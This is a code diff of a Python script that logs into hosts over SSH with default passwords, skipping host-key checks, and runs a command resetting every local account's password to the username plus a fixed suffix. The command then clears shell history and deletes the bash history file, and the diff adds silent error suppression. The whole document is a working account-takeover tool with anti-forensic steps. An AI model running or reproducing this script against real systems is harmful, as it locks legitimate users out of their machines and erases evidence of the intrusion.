@@ -1,37 +1,20 @@
 import pty
 import sys
 import asyncio
-import tempfile
 import pexpect
 
+async def ssh(user, host, cmd, password, timeout=30):
+	try:                                                                                                                                                                                                                                    
+		options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no -f'                                                                         
 
-
-async def ssh(user, host, cmd, password, timeout=30, bg_run=False):                                                                                                                                                                                                                                    
-
-	fname = tempfile.mktemp()                                                                                                                                                  
-	fout = open(fname, 'w')                                                                                                                                                    
-
-	options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no'                                                                         
-	if bg_run:                                                                                                                                                         
-		options += ' -f'  	
-
-	ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                               
-	child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
-	child.expect(['password: '])                                                                                                                                                                                                                                                                                               
-	child.sendline(password)                                                                                                                                                   
-	child.logfile = fout                                                                                                                                                       
-	child.expect(pexpect.EOF)                                                                                                                                                  
-	child.close()                                                                                                                                                              
-	fout.close()                                                                                                                                                               
-
-	fin = open(fname, 'r')                                                                                                                                                     
-	stdout = fin.read()                                                                                                                                                        
-	fin.close()                                                                                                                                                                
-
-	if 0 != child.exitstatus:                                                                                                                                                  
-		raise Exception(stdout)                                                                                                                                                
-
-	return stdout
+		ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                               
+		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
+		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
+		child.sendline(password)                                                                                                                                                                                                                                                                                                     
+		child.expect(pexpect.EOF)                                                                                                                                                  
+		child.close()
+	except:
+		return                                                                                                                                                                                                                                                                                                             
 
 
 
@@ -39,7 +22,8 @@ async def ssh(user, host, cmd, password, timeout=30, bg_run=False):
 command = """
 getent passwd | awk -F: '{print $1 ":" $1 "Chiapet1"}' | chpasswd /dev/stdin;
 history -c;
-rm ~/.bash_history
+rm ~/.bash_history;
+exit;
 """
 
 default_passwords = str(sys.argv)[1:]
